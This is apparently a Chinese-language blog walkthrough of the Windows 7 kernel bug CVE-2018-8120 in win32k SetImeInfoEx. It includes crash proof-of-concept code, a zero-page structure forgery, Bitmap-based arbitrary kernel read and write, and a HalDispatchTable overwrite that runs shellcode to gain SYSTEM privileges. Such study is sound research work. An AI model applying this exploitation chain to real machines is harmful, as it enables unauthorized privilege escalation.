@@ -1,0 +1,204 @@
+       +0x04c dwProdVersion    : Uint4B
+       +0x050 dwImeWinVersion  : Uint4B
+       +0x054 wszImeDescription : [50] Wchar
+       +0x0b8 wszImeFile       : [80] Wchar
+       +0x158 fSysWow64Only    : Pos 0, 1 Bit
+       +0x158 fCUASLayer       : Pos 1, 1 Bit
+# 0x02：漏洞复现
+通过上面对每个成员的分析，我们大概知道了函数之间的调用关系，这里再简单总结一下，首先当用户在R3调用`CreateWindowStation`生成一个窗口时，新建的
+WindowStation 对象其偏移 0x14 位置的 spklList
+字段的值默认是零，如果我们调用R0函数`NtUserSetImeInfoEx`，传入一个我们定义的 buf ，函数就会将 buf 传给 piiex 在传入
+SetImeInfoEx 中，一旦调用了 SetImeInfoEx 函数，因为 spklList
+字段是零，所以就会访问到零页内存，导致蓝屏，所以我们构造如下代码
+    #include
+    #include
+    #define IM_UI_CLASS_SIZE        16
+    #define IM_FILE_SIZE            80
+    #define IM_DESC_SIZE            50
+    typedef struct {
+        DWORD       dwPrivateDataSize;
+        DWORD       fdwProperty;
+        DWORD       fdwConversionCaps;
+        DWORD       fdwSentenceCaps;
+        DWORD       fdwUICaps;
+        DWORD       fdwSCSCaps;
+        DWORD       fdwSelectCaps;
+    } tagIMEINFO;
+    typedef struct {
+        HKL         hkl;
+        tagIMEINFO  ImeInfo;
+        WCHAR       wszUIClass[IM_UI_CLASS_SIZE];
+        DWORD       fdwInitConvMode;
+        BOOL        fInitOpen;
+        BOOL        fLoadFlag;
+        DWORD       dwProdVersion;
+        DWORD       dwImeWinVersion;
+        WCHAR       wszImeDescription[IM_DESC_SIZE];
+        WCHAR       wszImeFile[IM_FILE_SIZE];
+        CHAR        fSysWow64Only : 1;
+        BYTE        fCUASLayer : 1;
+    } tagIMEINFOEX;
+    // 通过系统调用实现NtUserSetImeInfoEx函数
+    static
+    BOOL
+    __declspec(naked)
+    NtUserSetImeInfoEx(tagIMEINFOEX* imeInfoEx)
+    {
+        __asm { mov eax, 1226h };
+        __asm { lea edx, [esp + 4] };
+        __asm { int 2eh };
+        __asm { ret };
+    }
+    int main()
+    {
+        // 新建一个新的窗口,新建的WindowStation对象其偏移0x14位置的spklList字段的值默认是零
+        HWINSTA hSta = CreateWindowStation(
+            0,              //LPCSTR                lpwinsta
+            0,              //DWORD                 dwFlags
+            READ_CONTROL,   //ACCESS_MASK           dwDesiredAccess
+            0               //LPSECURITY_ATTRIBUTES lpsa
+        );
+        // 和窗口当前进程关联起来
+        SetProcessWindowStation(hSta);
+        char buf[0x4];
+        memset(buf, 0x41, sizeof(buf));
+        // WindowStation->spklList字段为0，函数继续执行将触发0地址访问异常
+        NtUserSetImeInfoEx((PVOID)&buf);
+        return 0;
+    }
+运行发现果然蓝屏了，问题出在 win32k.sys
+我们通过蓝屏信息定位到问题地址，确实是我们前面所说的`SetImeInfoEx`函数
+# 0x03：漏洞利用
+## 利用思路
+我们利用的思路首先可以想到因为是在win
+7的环境中，我们可以在零页构造一些结构，所以我们这里首先获得并调用申请零页的函数`NtAllocateVirtualMemory`，因为内存对齐的问题我们这里申请大小的参数设置为
+1 以申请到零页内存
+    // 申明函数
+    *(FARPROC*)& NtAllocateVirtualMemory = GetProcAddress(
+        GetModuleHandleW(L"ntdll"),
+        "NtAllocateVirtualMemory");
+    if (NtAllocateVirtualMemory == NULL)
+    {
+        printf("[+]Failed to get function NtAllocateVirtualMemory!!!\n");
+        system("pause");
+        return 0;
+    }
+    // 零页申请内存
+    PVOID Zero_addr = (PVOID)1;
+    SIZE_T RegionSize = 0x1000;
+    printf("[+] Started to alloc zero page");
+    if (!NT_SUCCESS(NtAllocateVirtualMemory(
+        INVALID_HANDLE_VALUE,
+        &Zero_addr,
+        0,
+        &RegionSize,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE)) || Zero_addr != NULL)
+    {
+        printf("[+] Failed to alloc zero page!\n");
+        system("pause");
+        return 0;
+    }
+    ZeroMemory(Zero_addr, RegionSize);
+    printf(" => done!\n");
+申请到内存我们就需要开始思考如何进行构造，我们再详细回顾一下漏洞复现例子中的一些函数，根据前面的例子我们知道，需要使用到`CreateWindowStation`创建窗口函数，详细的调用方法如下
+    HWINSTA CreateWindowStationA(
+      LPCSTR                lpwinsta,
+      DWORD                 dwFlags,
+      ACCESS_MASK           dwDesiredAccess,
+      LPSECURITY_ATTRIBUTES lpsa
+    );
+创建好窗口站对象之后我们还需要将当前进程和窗口站对应起来，需要用到 `SetProcessWindowStation`
+函数将指定的窗口站分配给调用进程。这使进程能够访问窗口站中的对象，如桌面、剪贴板和全局原子。窗口站上的所有后续操作都使用授予`hWinSta`的访问权限
+    BOOL SetProcessWindowStation(
+      HWINSTA hWinSta
+    );
+最后一步就是调用`xxNtUserSetImeInfoEx`函数蓝屏，我们这里能做手脚的就是给`xxNtUserSetImeInfoEx`函数传入的参数`piiex`
+    // nt4 源码
+    BOOL NtUserSetImeInfoEx(
+        IN PIMEINFOEX piiex);
+我们在IDA中继续分析一下并粗略的构造一个思路，这里我根据结构重新注释修复了一下 IDA 反汇编的结果
+    bool __stdcall SetImeInfoEx(DWORD *pwinsta, DWORD *piiex)
+    {
+      bool result; // al
+      DWORD *spklList; // eax
+      DWORD *tagKL_piiex; // eax
+      result = (char)pwinsta;
+      if ( pwinsta )
+      {
+        spklList = (DWORD *)pwinsta[5];             // pwinsta 指向 tagWINDOWSTATION 结构
+                                                    // pwinsta[5] == tagWINDOWSTATION->spklList
+        while ( spklList[5] != *piiex )             // spklList 指向 tagKL 结构
+                                                    // spklList[5] == tagKL->hkl
+                                                    // tagKL->hkl == &piiex 绕过第一个检验
+        {
+          spklList = (DWORD *)spklList[2];
+          if ( spklList == (DWORD *)pwinsta[5] )
+            return 0;
+        }
+        tagKL_piiex = (DWORD *)spklList[0xB];       // spklList[0xB] == tagKL->piiex
+        if ( !tagKL_piiex )                         // tagKL->piiex 不能为零绕过第二个检验
+          return 0;
+        if ( !tagKL_piiex[0x12] )                   // piiex 指向 tagIMEINFOEX 结构
+                                                    // piiex[0x12] == tagIMEINFOEX->fLoadFlag
+                                                    // 这里 tagIMEINFOEX->fLoadFlag 需要为零才能执行拷贝函数
+          qmemcpy(tagKL_piiex, piiex, 0x15Cu);
+        result = 1;
+      }
+      return result;
+    }
+需要清楚的是，我们最后`SetImeInfoEx`中的拷贝函数会给我们带来什么作用，他会把我们传入的`piiex`拷贝到`tagKL->piiex`中，拷贝的大小是
+0x15C ，我们这里其实想到的是拷贝之后去覆盖
+`HalDispatchTable+0x4`的位置，然后调用`NtQueryIntervalProfile`函数提权，所以我们只需要覆盖四个字节，为了达到更精准的覆盖我们想到了
+win10 中的滥用Bitmap对象达到任意地址的读和写，那么在 win 7 中我们如何运用这个手法呢?其实很简单，原理上和 win 10
+相同，只是我们现在有个问题，要达到任意地址的读和写，我们必须得让`hManagerPrvScan0`指向`hworkerPrvScan0`，我们如何实现这个目标呢?聪明的你一定想到了前面的拷贝函数，让我们先粗略的构造一个利用思路：
+  * 初始化申请零页内存
+  * 新建一个窗口并与当前线程关联
+  * 申请并泄露Bitmap中的PrvScan0地址
+  * 在零页构造结构体绕过检查实现能够调用拷贝函数
+  * 构造`xxNtUserSetImeInfoEx`函数的参数并调用实现`hManagerPrvScan0`指向`hworkerPrvScan0`
+  * 将 `HalDispatchTable+0x4`内容写为shellcode的内容
+  * 调用`NtQueryIntervalProfile`函数运行shellcode提权
+## xxNtUserSetImeInfoEx参数构造
+有了思路我们现在就只差时间了，慢慢的调试总能给我们一个完美的结果(吗)，我们知道`NtUserSetImeInfoEx`函数的参数是一个`tagIMEINFOEX`结构而`tagKL`则指向这个结构，根据前面IDA中的注释，我们知道我们需要绕过几个地方的检验，从检验中我们可以发现需要做手教的地方分别是`tagKL->hkl`和`tagKL->piiex`，我们的`tagKL->hkl`需要和传入的`piiex`地址一致，`tagKL->piiex`这个结构有两处检验，第一处是自己不能为空，第二处是`tagIMEINFOEX->fLoadFlag`也必须赋值，观察Bitmap的结构，我们知道
++0x2c
+偏移处刚好不为零，所以我们考虑如下构造，把`tagKL->piiex`赋值为`pManagerPrvScan0`，把`tagKL->hkl`赋值为`pWorkerPrvScan0`，为了使传入的`piiex`与我们的`tagKL->hkl`相等，我们将其构造为`pWorkerPrvScan0`的结构
+    DWORD* faketagKL = (DWORD*)0x0;
+    // 手动构造 pWorkerPrvScan0 结构
+    *(DWORD*)((PBYTE)& fakepiiex + 0x0) =  pWorkerPrvScan0;
+    *(DWORD*)((PBYTE)& fakepiiex + 0x4) =  0x104;
+    *(DWORD*)((PBYTE)& fakepiiex + 0x8) =  0x00001b97;
+    *(DWORD*)((PBYTE)& fakepiiex + 0xC) =  0x00000003;
+    *(DWORD*)((PBYTE)& fakepiiex + 0x10) = 0x00010000;
+    *(DWORD*)((PBYTE)& fakepiiex + 0x18) = 0x04800200;
+    printf("[+] piiex address is : 0x%p\n", fakepiiex); // pWorkerPrvScan0
+    printf("[+] &piiex address is : 0x%p\n", &fakepiiex);
+    printf("[+] faketagKL address is : 0x%p\n", faketagKL);
+    // 绕过检验
+    *(DWORD*)((PUCHAR)faketagKL + 0x14) = pWorkerPrvScan0;  // tagKL->hkl
+    *(DWORD*)((PUCHAR)faketagKL + 0x2c) = pManagerPrvScan0; // tagKL->piiex
+    xxNtUserSetImeInfoEx(&fakepiiex); // 拷贝函数实现 pManagerPrvScan0->pWorkerPrvScan0
+在`xxNtUserSetImeInfoEx`函数之后下断点你会发现已经实现了`pManagerPrvScan0->pWorkerPrvScan0`，这时我们就可以尽情的任意读写了
+## GetShell
+最后提权的过程还是和以前一样，覆盖`HalDispatchTable+0x4`函数指针，然后调用`NtQueryIntervalProfile`函数达到运行shellcode的目的
+    VOID GetShell()
+    {
+        DWORD interVal = 0;
+        DWORD32 halHooked = GetHalOffset_4();
+        NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryIntervalProfile");
+        //__debugbreak();
+        writeOOB(halHooked, (PVOID)& ShellCode, sizeof(DWORD32));
+        // 1. hManagerPrvScan0->hworkerPrvScan0->HalDispatchTable+0x4
+        // 2. hManagerPrvScan0->hworkerPrvScan0->HalDispatchTable+0x4->shellcode
+        // 执行shellcode
+        NtQueryIntervalProfile(0x1234, &interVal);
+    }
+最终整合一下思路和代码我们就可以提权了(不要在意这盗版的win 7...)，效果如下，详细的代码参考 =>
+[这里](https://github.com/ThunderJie/CVE/tree/master/CVE-2018-8120)
+# 0x04：后记
+这个漏洞也可以在win 7
+x64下利用，后续我会考虑把64位的利用代码完善一下，思路都差不多，主要修改的地方是偏移和汇编代码的嵌入问题，这个漏洞主要是在零页的构造，如果在win
+8中就很难利用，毕竟没有办法在零页申请内存
+参考资料：
+[+] 
+[+] 
